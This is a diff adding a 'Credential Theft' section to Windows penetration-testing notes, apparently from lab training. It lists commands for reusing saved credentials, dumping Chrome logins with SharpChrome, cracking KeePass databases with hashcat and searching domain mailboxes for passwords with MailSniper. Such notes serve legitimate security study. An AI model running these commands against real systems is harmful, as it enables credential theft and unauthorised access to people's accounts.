@@ -822,8 +822,46 @@ get-service | ? {$_.DisplayName -like 'Druva*'}
 
 ```
 
-# Saved Creds
+# Credential Theft
+
+### Listing Saved Credentials
 ```powershell
 cmdkey /list
-runas /user:<user> /savecred "command"
+runas /user:<domain>\<user> /savecred "COMMAND HERE"
+runas /user:inlanefreight\bob /savecred "whoami"
+```
+
+### Browser Credentials
+- Retrieving Saved Credentials from Chrome
+- [SharpChrome](https://github.com/GhostPack/SharpDPAPI?tab=readme-ov-file#sharpchrome-command-line-usage)
+```powershell
+.\SharpChrome.exe logins /unprotect
+```
+
+### Password Managers
+- KeePass
+- Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a KeePass database which is often protected by just a master password.
+```powershell
+keepass2john ILFREIGHT_Help_Desk.kdbx
+
+hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+### Email
+- If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc.
+- [](https://github.com/dafthack/MailSniper)
+```powershell
+# To search all mailboxes in a domain:
+Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -OutputCsv global-email-search.csv
+
+# To search the current user's mailbox:
+Invoke-SelfSearch -Mailbox current-user@domain.com
+```
+
+### Local creds 
+- [LaZagne](https://github.com/AlessandroZ/LaZagne)
+- [Search for local creds](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Windows%20Privilege%20Escalation/Enumeration/README.md#creds)
+
+```
+
 ```
